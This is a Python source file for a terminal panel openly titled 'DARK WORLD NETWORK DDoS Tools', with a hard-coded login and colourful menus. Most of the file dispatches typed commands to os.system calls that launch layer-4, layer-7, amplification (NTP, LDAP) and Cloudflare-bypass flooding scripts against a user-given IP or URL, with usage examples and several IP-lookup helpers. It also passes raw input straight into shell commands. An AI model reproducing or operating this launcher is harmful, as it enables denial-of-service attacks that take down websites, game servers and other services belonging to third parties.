import socket
import os
import requests
import random
import getpass
import time
import sys
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
 
# proxies.txt না থাকলে তৈরি করো
if not os.path.exists('proxies.txt'):
    print("[!] proxies.txt ফাইল পাওয়া যায়নি, তৈরি করা হচ্ছে...")
    with open('proxies.txt', 'w') as f:
        f.write("123.456.789.000:8080\n")
        f.write("192.168.0.1:3128\n")
        f.write("10.0.0.2:8000\n")
 
proxys = open('proxies.txt').readlines()
 
bots = len(proxys)

def ascii_vro():
    clear()
    print(r'''
          _____          
         /\    \         
        /::\    \        
       /::::\    \       
      /::::::\    \      
     /:::/\:::\    \     
    /:::/  \:::\    \    
   /:::/    \:::\    \   
  /:::/    / \:::\    \  
 /:::/    /   \:::\ ___\ 
/:::/____/     \:::|    |
\:::\    \     /:::|____|
 \:::\    \   /:::/    / 
  \:::\    \ /:::/    /  
   \:::\    /:::/    /   
    \:::\  /:::/    /    
     \:::\/:::/    /     
      \::::::/    /      
       \::::/    /       
        \::/____/        
         ~~              
                         
   ''')
    time.sleep(0.6)
    clear()
    print(r'''
          _____          
         /\    \         
        /::\____\        
       /:::/    /        
      /:::/   _/___      
     /:::/   /\    \     
    /:::/   /::\____\    
   /:::/   /:::/    /    
  /:::/   /:::/   _/___  
 /:::/___/:::/   /\    \ 
|:::|   /:::/   /::\____\
|:::|__/:::/   /:::/    /
 \:::\/:::/   /:::/    / 
  \::::::/   /:::/    /  
   \::::/___/:::/    /   
    \:::\__/:::/    /    
     \::::::::/    /     
      \::::::/    /      
       \::::/    /       
        \::/____/        
         ~~              
                         
   ''')
    time.sleep(0.6)
    clear()
    print(f'''
DRAK WORLD NETWORK 
                         
   ''')
    time.sleep(0.6)
    clear()
    print(r"""
          _____          
         /\    \         
        /::\____\        
       /::::|   |        
      /:::::|   |        
     /::::::|   |        
    /:::/|::|   |        
   /:::/ |::|   |        
  /:::/  |::|   | _____  
 /:::/   |::|   |/\    \ 
/:: /    |::|   /::\____\
\::/    /|::|  /:::/    /
 \/____/ |::| /:::/    / 
         |::|/:::/    /  
         |::::::/    /   
         |:::::/    /    
         |::::/    /     
         /:::/    /      
        /:::/    /       
        \::/    /        
         \/____/         
                         
 --------------SK DWN 77------------
    """)
    time.sleep(0.8)
    clear()

def si():
    print(f"""
                          \x1b[38;2;255;0;0m(     (           (     
                          \x1b[38;2;255;69;0m )\ )  )\ )        )\ )  
                          \x1b[38;2;255;140;0m(()/( (()/(       (()/(  
                          \x1b[38;2;255;215;0m /(_)) /(_))   (   /(_)) 
                          \x1b[38;2;255;255;0m(_))_ (_))_    )\ (_))   
                          \x1b[38;2;255;255;128m |   \ |   \  ((_)/ __|  
                          \x1b[38;2;255;255;255m | |) || |) |/ _ \\__ \  
                          \x1b[38;2;200;200;200m |___/ |___/ \___/|___/
                          \x1b[0m
""")

def banners():
    clear()
    si()
    print(f'''
                                \x1b[38;2;255;0;0m╔═══════════════╗
                                \x1b[38;2;255;69;0m║     \x1b[38;2;255;140;0mBanners   \x1b[38;2;255;69;0m║
                \x1b[38;2;255;215;0m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;255;255;0m║  \x1b[38;2;255;255;128mtroll               \x1b[38;2;255;255;0m║  \x1b[38;2;255;255;128m<empty>               \x1b[38;2;255;255;0m║
                \x1b[38;2;255;255;255m║  \x1b[38;2;200;200;200mpikachu             \x1b[38;2;255;255;255m║  \x1b[38;2;200;200;200m<empty>               \x1b[38;2;255;255;255m║  
                \x1b[38;2;255;0;0m║  \x1b[38;2;255;69;0m<empty>             \x1b[38;2;255;0;0m║  \x1b[38;2;255;69;0m<empty>               \x1b[38;2;255;0;0m║
                \x1b[38;2;255;69;0m║  \x1b[38;2;255;140;0m<empty>             \x1b[38;2;255;69;0m║  \x1b[38;2;255;140;0m<empty>               \x1b[38;2;255;69;0m║
                \x1b[38;2;255;140;0m║  \x1b[38;2;255;215;0m<empty>             \x1b[38;2;255;140;0m║  \x1b[38;2;255;215;0m<empty>               \x1b[38;2;255;140;0m║
                \x1b[38;2;255;215;0m╚══════════════════════╩════════════════════════╝
                \x1b[0m''')

def rules():
    clear()
    si()
    print(f'''
\x1b[38;2;0;212;14m╔═══════════════╗
\x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mRules     \x1b[38;2;0;212;14m║
\x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗
\x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m2. Do not attack .gov/.gob/.edu/.mil domains  \x1b[38;2;0;212;14m║
\x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m4. Only attack stress testing servers         \x1b[38;2;0;212;14m║
\x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m5. Don't skid the panel                       \x1b[38;2;0;212;14m║
\x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m6. Give a star to the github repository       \x1b[38;2;0;212;14m║
\x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m7. The creator does not do any harm           \x1b[38;2;0;212;14m║
\x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝
''')

def ports():
    clear()
    si()
    print(f'''
\x1b[38;2;255;0;0m                                ╔═══════════════╗
\x1b[38;2;255;69;0m                                ║     \x1b[38;2;255;140;0mPorts     \x1b[38;2;255;69;0m║
\x1b[38;2;255;69;0m                ╔═══════════════╩═══════════════╩═══════════════╗
\x1b[38;2;255;140;0m                ║ \x1b[38;2;255;215;0m21 - SFTP       69   - TFTP      5060  - RIP  \x1b[38;2;255;140;0m║
\x1b[38;2;255;140;0m                ║ \x1b[38;2;255;255;0m22 - SSH        80   - HTTP      30120 - FIVEM\x1b[38;2;255;140;0m║
\x1b[38;2;255;215;0m                ║ \x1b[38;2;255;140;0m23 - TELNET     443  - HTTPS                  \x1b[38;2;255;215;0m║   
\x1b[38;2;255;255;0m                ║ \x1b[38;2;255;69;0m25 - SMTP       3074 - XBOX                   \x1b[38;2;255;255;0m║
\x1b[38;2;255;255;0m                ║ \x1b[38;2;255;0;0m53 - DNS        5060 - PLAYSTATION            \x1b[38;2;255;255;0m║
\x1b[38;2;255;140;0m                ║ \x1b[38;2;255;69;0m25 - MINECRAFT       25565 - MINECRAFT        \x1b[38;2;255;140;0m║
\x1b[38;2;255;69;0m                ╚═══════════════════════════════════════════════╝
\x1b[0m''')

def special():
    clear()
    si()
    print(f'''
\x1b[38;2;255;0;0m                                ╔═══════════════╗
\x1b[38;2;255;69;0m                                ║    \x1b[38;2;255;140;0mSpecial    \x1b[38;2;255;69;0m║
\x1b[38;2;255;69;0m                ╔═══════════════╩══════╦════════╩═══════════════╗
\x1b[38;2;255;140;0m                ║  \x1b[38;2;255;215;0mstress              \x1b[38;2;255;140;0m║  \x1b[38;2;255;215;0m<empty>               \x1b[38;2;255;140;0m║
\x1b[38;2;255;140;0m                ║  \x1b[38;2;255;255;0m<empty>             \x1b[38;2;255;140;0m║  \x1b[38;2;255;255;0m<empty>               \x1b[38;2;255;140;0m║  
\x1b[38;2;255;215;0m                ║  \x1b[38;2;255;140;0m<empty>             \x1b[38;2;255;215;0m║  \x1b[38;2;255;140;0m<empty>               \x1b[38;2;255;215;0m║
\x1b[38;2;255;255;0m                ║  \x1b[38;2;255;69;0m<empty>             \x1b[38;2;255;255;0m║  \x1b[38;2;255;69;0m<empty>               \x1b[38;2;255;255;0m║
\x1b[38;2;255;255;0m                ║  \x1b[38;2;255;0;0m<empty>             \x1b[38;2;255;255;0m║  \x1b[38;2;255;0;0m<empty>               \x1b[38;2;255;255;0m║
\x1b[38;2;255;69;0m                ╚══════════════════════╩════════════════════════╝
\x1b[0m
    ''')
    
def layer7():
    clear()
    si()
    print(f'''
    \x1b[38;2;255;0;0m                          ╔═══════════════╗
\x1b[38;2;255;69;0m                              ║    \x1b[38;2;255;140;0mLayer 7    \x1b[38;2;255;69;0m║
\x1b[38;2;255;69;0m               ╔══════════════╩════════╦══════╩══════════════╗
\x1b[38;2;255;140;0m               ║   \x1b[38;2;255;215;0mhttp-raw            \x1b[38;2;255;140;0m║   \x1b[38;2;255;215;0mDWN               \x1b[38;2;255;140;0m║
\x1b[38;2;255;140;0m               ║   \x1b[38;2;255;215;0mhttp-socket         \x1b[38;2;255;140;0m║   \x1b[38;2;255;215;0mhttpflood         \x1b[38;2;255;140;0m║
\x1b[38;2;255;140;0m               ║   \x1b[38;2;255;215;0mhttp-storm          \x1b[38;2;255;140;0m║   \x1b[38;2;255;215;0mcf-socket         \x1b[38;2;255;140;0m║
\x1b[38;2;255;140;0m               ║   \x1b[38;2;255;255;0mhttp-rand           \x1b[38;2;255;140;0m║   \x1b[38;2;255;255;0mcf-pro            \x1b[38;2;255;140;0m║
\x1b[38;2;255;215;0m               ║   \x1b[38;2;255;255;0moverflow            \x1b[38;2;255;215;0m║   \x1b[38;2;255;255;0mhyper             \x1b[38;2;255;215;0m║
\x1b[38;2;255;215;0m               ║   \x1b[38;2;255;255;0mcf-bypass           \x1b[38;2;255;215;0m║   \x1b[38;2;255;255;0mslow              \x1b[38;2;255;215;0m║
\x1b[38;2;255;215;0m               ║   \x1b[38;2;255;255;0muambypass           \x1b[38;2;255;215;0m║   \x1b[38;2;255;255;0mhttps-spoof       \x1b[38;2;255;215;0m║
\x1b[38;2;255;215;0m               ║   \x1b[38;2;255;255;0movh-raw             \x1b[38;2;255;215;0m║   \x1b[38;2;255;255;0movh-beam          \x1b[38;2;255;215;0m║
\x1b[38;2;255;0;0m               ╚═══════════════════════╩═════════════════════╝
\x1b[0m
    ''')

def layer4():
    clear()
    si()
    print(f'''
\x1b[38;2;255;0;0m                              ╔═══════════════╗
\x1b[38;2;255;69;0m                              ║    \x1b[38;2;255;140;0mLayer 4    \x1b[38;2;255;69;0m║
\x1b[38;2;255;69;0m               ╔══════════════╩════════╦══════╩══════════════╗
\x1b[38;2;255;140;0m               ║   \x1b[38;2;255;215;0mudp                 \x1b[38;2;255;140;0m║   \x1b[38;2;255;215;0mtcp               \x1b[38;2;255;140;0m║
\x1b[38;2;255;140;0m               ║   \x1b[38;2;255;255;0mnfo-killer          \x1b[38;2;255;140;0m║   \x1b[38;2;255;255;0mstd               \x1b[38;2;255;140;0m║
\x1b[38;2;255;215;0m               ║   \x1b[38;2;255;140;0mudpbypass           \x1b[38;2;255;215;0m║   \x1b[38;2;255;140;0mdestroy           \x1b[38;2;255;215;0m║
\x1b[38;2;255;255;0m               ║   \x1b[38;2;255;69;0mhome                \x1b[38;2;255;255;0m║   \x1b[38;2;255;69;0mgod               \x1b[38;2;255;255;0m║
\x1b[38;2;255;69;0m               ║   \x1b[38;2;255;0;0mslowloris           \x1b[38;2;255;69;0m║   \x1b[38;2;255;0;0mflux              \x1b[38;2;255;69;0m║
\x1b[38;2;255;0;0m               ║   \x1b[38;2;255;140;0mstdv2               \x1b[38;2;255;0;0m║   \x1b[38;2;255;140;0m<empty>           \x1b[38;2;255;0;0m║
\x1b[38;2;255;0;0m               ╚═══════════════════════╩═════════════════════╝
\x1b[0m
''')

def amp_games():
    clear()
    si()
    print(f'''
\x1b[38;2;255;0;0m                              ╔═══════════════╗
\x1b[38;2;255;69;0m                              ║\x1b[38;2;255;140;0m AMP's \x1b[38;2;255;69;0m/ \x1b[38;2;255;140;0mDRAK \x1b[38;2;255;69;0m ║
\x1b[38;2;255;69;0m               ╔══════════════╩════════╦══════╩══════════════╗
\x1b[38;2;255;140;0m               ║   \x1b[38;2;255;215;0movh-amp             \x1b[38;2;255;140;0m║   \x1b[38;2;255;215;0movh-amp           \x1b[38;2;255;140;0m║
\x1b[38;2;255;140;0m               ║   \x1b[38;2;255;255;0mminecraft           \x1b[38;2;255;140;0m║   \x1b[38;2;255;255;0mstd               \x1b[38;2;255;140;0m║
\x1b[38;2;255;215;0m               ║   \x1b[38;2;255;140;0msamp                \x1b[38;2;255;215;0m║   \x1b[38;2;255;140;0mldap              \x1b[38;2;255;215;0m║
\x1b[38;2;255;255;0m               ║   \x1b[38;2;255;69;0m<empty>             \x1b[38;2;255;255;0m║   \x1b[38;2;255;69;0m<empty>           \x1b[38;2;255;255;0m║
\x1b[38;2;255;69;0m               ╚═══════════════════════╩═════════════════════╝
\x1b[0m
''')


def menu():
    sys.stdout.write(f"         \x1b]2;ZxC C2 --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07")
    clear()
    
    print("")
    print("")
    
    
    # Red text example
    print("")


    print(r"""
                                      ,--. 
    ,---,               .---.       ,--.\; 
  .'  .' `\            /. ./|   ,--,:  : | 
,---.'     \       .--'.  ' ;,`--.'`|  ' : 
|   |  .`\  |     /__./ \ : ||   :  :  | | 
:   : |  '  | .--'.  '   \' .:   |   \ | : 
|   ' '  ;  :/___/ \ |    ' '|   : '  '; | 
'   | ;  .  |;   \  \;      :'   ' ;.    ; 
|   | :  |  ' \   ;  `      ||   | | \   | 
'   : | /  ;   .   \    .\  ;'   : |  ; .' 
|   | '` ,/     \   \   ' \ ||   | '`--'   
;   :  .'        :   '  |--" '   : |       
|   ,.'           \   \ ;    ;   |.'       
'---'              '---"     '---'         
——DARK WORLD NETWORK DDoS Tools——

""")
print("\033[33m")
def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;2;255;0;0m╔══[WDN\x1b[38;2;255;69;0m-\x1b[38;2;255;140;0m7\x1b[38;2;255;215;0m7\x1b[38;2;255;255;0m]
\x1b[38;2;255;0;0m╚\x1b[38;2;255;69;0m═\x1b[38;2;255;140;0m═\x1b[38;2;255;215;0m═\x1b[38;2;255;255;128m═\x1b[38;2;255;255;255m➤ \x1b[38;2;255;255;255m''')

        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            amp_games()
        elif cnc == "special" or cnc == "SPECIAL" or cnc == "specialS" or cnc == "SPECIALS":
            special()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()
        elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
            banners()

# LAYER 4 METHODS   

        elif "udpbypass" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./UDPBYPASS {ip} {port}')
            except IndexError:
                print('Usage: udpbypass <ip> <port>')
                print('Example: udpbypass 1.1.1.1 80')

        elif "stdv2" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./std {ip} {port}')
            except IndexError:
                print('Usage: stdv2 <ip> <port>')
                print('Example: stdv2 1.1.1.1 80')

        elif "flux" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'./flux {ip} {port} {thread} 0')
            except IndexError:
                print('Usage: flux <ip> <port> <threads>')
                print('Example: flux 1.1.1.1 80 250')

        elif "slowloris" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./slowloris {ip} {port}')
            except IndexError:
                print('Usage: slowloris <ip> <port>')
                print('Example: slowloris 1.1.1.1 80')

        elif "god" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl god.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: god <ip> <port> <time>')
                print('Example: god 1.1.1.1 80 60')

        elif "destroy" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl destroy.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: destroy <ip> <port> <time>')
                print('Example: destroy 1.1.1.1 80 60')

        elif "std" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./STD-NOSPOOF {ip} {port}')
            except IndexError:
                print('Usage: std <ip> <port>')
                print('Example: std 1.1.1.1 80')

        elif "home" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                psize = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'perl home.pl {ip} {port} {psize} {time}')
            except IndexError:
                print('Usage: home <ip> <port> <packet_size> <time>')
                print('Example: home 1.1.1.1 80 65500 60')

        elif "udp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 udp.py {ip} {port} 0 0')
            except IndexError:
                print('Usage: udp <ip> <port>')
                print('Example: udp 1.1.1.1 80')

        elif "nfo-killer" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./nfo-killer {ip} {port} {threads} -1 {time}')
            except IndexError:
                print('Usage: nfo-killer <ip> <port> <threads> <time>')
                print('Example: nfo-killer 1.1.1.1 80 850 60')

        elif "ovh-raw" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./ovh-raw {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: ovh-raw GET 1.1.1.1 80 60 8500')

        elif "tcp" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./100UP-TCP {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: tcp GET 1.1.1.1 80 60 8500')

# SPECIAL METHODS

        elif "stress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print('Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print('MODE: [1] TCP')
                print('      [2] UDP')
                print('      [3] HTTP')
                print('Example: stress 1.1.1.1 80 3 1250 60 5')
                
# AMP/GAMES METHODS

        elif "samp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 samp.py {ip} {port}')
            except IndexError:
                print('Usage: samp <ip> <port>')
                print('Example: samp 1.1.1.1 7777')

        elif "ldap" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./ldap {ip} {port} {thread} -1 {time}')
            except IndexError:
                print('Usage: ldap <ip> <port> <threads> <time>')
                print('Example: ldap 1.1.1.1 80 650 60')

        elif "minecraft" in cnc:
            try:
                ip = cnc.split()[1]
                throttle = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./MINECRAFT-SLAM {ip} {threads} {time}')
            except IndexError:
                print('Usage: minecraft <ip> <throttle> <threads> <time>')
                print('Example: minecraft 1.1.1.1 5000 500 60')

        elif "ovh-amp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./OVH-AMP {ip} {port}')
            except IndexError:
                print('Usage: ovh-amp <ip> <port>')
                print('Example: ovh-amp 1.1.1.1 80')
                
        elif "ntp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                throttle = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./ntp {ip} {port} ntp.txt {throttle} {time}')
            except IndexError:
                print('Usage: ntp <ip> <port> <throttle> <time>')
                print('Example: ntp 1.1.1.1 22 250 60')

# LAYER 7 METHODS
 
        elif "ovh-beam" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4] 
                os.system(f'./OVH-BEAM {method} {ip} {port} {time} 1024')
            except IndexError:
                print('Usage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
                print('Example: ovh-beam GET 51.38.92.223 80 60')
    
        elif "https-spoof" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'python3 https-spoof.py {url} {time} {thread}')
            except IndexError:
                print('Usage: https-spoof <url> <time> <threads>')
                print('Example: https-spoof http://vailon.com 60 500')
    
        elif "slow" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node slow.js {url} {time}')
            except IndexError:
                print('Usage: slow <url> <time>')
                print('Example: slow http://vailon.com 60')
    
        elif "hyper" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node hyper.js {url} {time}')
            except IndexError:
                print('Usage: hyper <url> <time>')
                print('Example: hyper http://vailon.com 60')
                
        elif "cf-socket" in cnc:
            try:
                os.system(f'python3 bypass.py')
            except IndexError:
                print('cf-socket')
    
        elif "cf-pro" in cnc:
            try:
                os.system(f'python3 cf-pro.py')
            except IndexError:
                print('cf-pro')
        elif "cf-socket" in cnc:
            try:
                os.system(f'python3 bypass.py')
            except IndexError:
                print('cf-socket')
        
        elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node HTTP-SOCKET {url} {per} {time}')
            except IndexError:
                print('Usage: http-socket <url> <per> <time>')
                print('Example: http-socket http://example.com 5000 60')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW {url} {time}')
            except IndexError:
                print('Usage: http-raw <url> <time>')
                print('Example: http-raw http://example.com 60')

        elif "http-requests" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-REQUESTS {url} {time}')
            except IndexError:
                print('Usage: http-requests <url> <time>')
                print('Example: http-requests http://example.org 60')

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print('Usage: http-rand <url> <time>')
                print('Example: http-rand http://vailon.com/ 60')

        elif "overflow" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'./OVERFLOW {ip} {port} {thread}')
            except IndexError:
                print('Usage: overflow <ip> <port> <threads>')
                print('Example: overflow 1.1.1.1 80 5000')

        elif "cf-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'node cf.js {url} {time} {thread}')
            except IndexError:
                print('Usage: cf-bypass <url> <time> <threads>')
                print('Example: cf-bypass http://example.com 60 1250')

        elif "uambypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                per = cnc.split()[3]
                os.system(f'node uambypass.js {url} {time} {per} http.txt')
            except IndexError:
                print('Usage: uambypass <url> <time> <req_per_ip>')
                print('Example: uambypass http://example.com 60 1250')

        elif "DWN" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run Hulk.go -site {url} -data {method}')
            except IndexError:
                print('Usage: GET/POST <url> DWN')
                print('Example: GET https://example.com SK')

        elif "httpflood" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
                print('Example: httpflood http://example.com 15000 get 60')

        elif "httpget" in cnc:
            try:
                url = cnc.split()[1]
                os.system(f'./httpget {url} 10000 50 100')
            except IndexError:
                print('Usage: httpget <url>')
                print('Example: httpget http://example.com')

# BANNERS

        elif "troll" in cnc:
                print('SK')

        elif "pikachu" in cnc:
                print('DWN')

                
# TOOLS
        elif "geoip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: geoip <ip>')
                print('Example: geoip 1.1.1.1')

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')

        elif "dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns-lookup <dns>')
                print('Example: dns-lookup google.com')

        elif "reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')                

        elif "cloudflare-lag" in cnc:
            print('Method "CLOUDFLARE-LAG" not enabled')

        elif "help" in cnc:
            print(f'''
LAYER7  ► SHOW LAYER7 METHODS
LAYER4  ► SHOW LAYER4 METHODS
AMP     ► SHOW AMP METHODS
SPECIAL ► SHOW SPECIAL METHODS
BANNERS ► SHOW BANNERS
RULES   ► RULES PANEL
PORTS   ► SHOW ALL PORTS
TOOLS   ► SHOW TOOLS
CLEAR   ► CLEAR TERMINAL
            ''')
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
    user = "DWN"
    passwd = "DWN"
    username = input("♀️ User: ")
    password = input("♀️ Pass: ")
    if username != user or password != passwd:
        print("")
        print("🚫 Wrong Password...")
        print(" ☠�  Enter Right Credentials ")
        print(" ☠� SK Is Here Kidz ")
        sys.exit(1)
    elif username == user and password == passwd:
        print("♻️ Welcome to DWN")
        time.sleep(0.3)
        ascii_vro()
        main()

login()
